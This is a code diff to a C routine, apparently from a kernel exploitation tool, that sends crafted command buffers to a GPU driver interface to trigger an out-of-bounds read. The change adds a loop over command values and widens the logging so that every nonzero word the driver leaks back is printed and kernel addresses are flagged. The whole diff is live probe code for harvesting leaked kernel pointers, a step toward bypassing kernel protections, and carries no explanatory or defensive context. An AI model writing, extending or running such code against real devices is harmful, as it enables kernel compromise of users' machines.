@@ -752,6 +752,7 @@ void nk_iogpu_group_oob_run(int trigger)
         }
 
         static const uint64_t ids[] = { 0, 1, 2, 3, 0xffffffff, 0x10000 };
+        for (uint32_t cmd7 = 0; cmd7 <= 128; cmd7 += 128) {
         for (uint32_t ii = 0; ii < sizeof(ids)/sizeof(ids[0]); ii++) {
             for (uint32_t f72 = 1; f72 <= 2; f72++) {
                 memset(pool, 0xBB, sizeof(pool));
@@ -760,7 +761,7 @@ void nk_iogpu_group_oob_run(int trigger)
 
                 uint8_t *in7 = pool;
                 memset(in7, 0, 0x100);
-                uint64_t c0 = 0;
+                uint64_t c0 = cmd7;
                 memcpy(in7 + 0, &c0, 8);
                 uint64_t tok = 0;
                 memcpy(in7 + 24, &tok, 8);
@@ -782,9 +783,9 @@ void nk_iogpu_group_oob_run(int trigger)
                     if (pool[o] != 0xBB) { first_tail = o; break; }
                 for (size_t o = 0; o < sizeof(userbuf); o++)
                     if (userbuf[o] != 0xCC) { first_user = o; break; }
-                ol("[grp] id=0x%llx f72=%u -> kr=0x%x outN=%zu struct_first=0x%zx "
+                ol("[grp] cmd=%u id=0x%llx f72=%u -> kr=0x%x outN=%zu struct_first=0x%zx "
                    "tail_first=0x%zx user_first=0x%zx",
-                   (unsigned long long)ids[ii], f72, kr, on7, first_struct, first_tail, first_user);
+                   cmd7, (unsigned long long)ids[ii], f72, kr, on7, first_struct, first_tail, first_user);
                 size_t shown = 0;
                 for (size_t o = 0; o < sizeof(pool) && shown < 24; o += 8) {
                     uint64_t w = 0;
@@ -803,14 +804,17 @@ void nk_iogpu_group_oob_run(int trigger)
                     ol("[grp]   user+0x%04zx = 0x%016llx%s", o, (unsigned long long)w,
                        grp_is_kernel_va(w) ? "   <-- KERNEL ADDRESS" : "");
                 }
-                for (size_t o = 0; o + 8 <= on7; o += 8) {
+                size_t oshown = 0;
+                for (size_t o = 0; o + 8 <= on7 && oshown < 32; o += 8) {
                     uint64_t w = 0;
                     memcpy(&w, out7 + o, 8);
-                    if (w && grp_is_kernel_va(w))
-                        ol("[grp]   OUT+0x%03zx = 0x%016llx   <-- KERNEL ADDRESS", o,
-                           (unsigned long long)w);
+                    if (!w) continue;
+                    oshown++;
+                    ol("[grp]   OUT+0x%03zx = 0x%016llx%s", o, (unsigned long long)w,
+                       grp_is_kernel_va(w) ? "   <-- KERNEL ADDRESS" : "");
                 }
             }
+        }
         }
         ol("[grp] read-out probe done");
     }
